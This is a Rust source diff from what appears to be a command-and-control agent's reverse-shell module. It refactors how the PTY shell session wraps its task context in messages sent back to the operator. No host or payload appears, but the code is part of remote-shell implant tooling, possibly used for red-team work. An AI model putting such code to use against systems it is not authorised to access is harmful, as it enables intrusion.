@@ -1,5 +1,7 @@
 use anyhow::Result;
-use pb::c2::{ReverseShellMessageKind, ReverseShellRequest, TaskContext};
+use pb::c2::{
+    reverse_shell_request, ReverseShellMessageKind, ReverseShellRequest, TaskContext,
+};
 use portable_pty::{CommandBuilder, PtySize, native_pty_system};
 use std::io::{Read, Write};
 use transport::Transport;
@@ -27,7 +29,9 @@ pub async fn run_reverse_shell_pty<T: Transport>(
     // First, send an initial registration message
     if let Err(_err) = output_tx
         .send(ReverseShellRequest {
-            context: Some(task_context.clone()),
+            context: Some(reverse_shell_request::Context::TaskContext(
+                task_context.clone(),
+            )),
             kind: ReverseShellMessageKind::Ping.into(),
             data: Vec::new(),
         })
@@ -124,7 +128,9 @@ pub async fn run_reverse_shell_pty<T: Transport>(
 
             if let Err(_err) = output_tx_clone
                 .send(ReverseShellRequest {
-                    context: Some(task_context_clone.clone()),
+                    context: Some(reverse_shell_request::Context::TaskContext(
+                        task_context_clone.clone(),
+                    )),
                     kind: ReverseShellMessageKind::Data.into(),
                     data: buffer[..n].to_vec(),
                 })
@@ -138,7 +144,9 @@ pub async fn run_reverse_shell_pty<T: Transport>(
             // Ping to flush
             if let Err(_err) = output_tx_clone
                 .send(ReverseShellRequest {
-                    context: Some(task_context_clone.clone()),
+                    context: Some(reverse_shell_request::Context::TaskContext(
+                        task_context_clone.clone(),
+                    )),
                     kind: ReverseShellMessageKind::Ping.into(),
                     data: Vec::new(),
                 })
@@ -170,7 +178,9 @@ pub async fn run_reverse_shell_pty<T: Transport>(
             if msg.kind == ReverseShellMessageKind::Ping as i32 {
                 if let Err(_err) = output_tx
                     .send(ReverseShellRequest {
-                        context: Some(task_context_clone),
+                        context: Some(reverse_shell_request::Context::TaskContext(
+                            task_context_clone,
+                        )),
                         kind: ReverseShellMessageKind::Ping.into(),
                         data: msg.data,
                     })
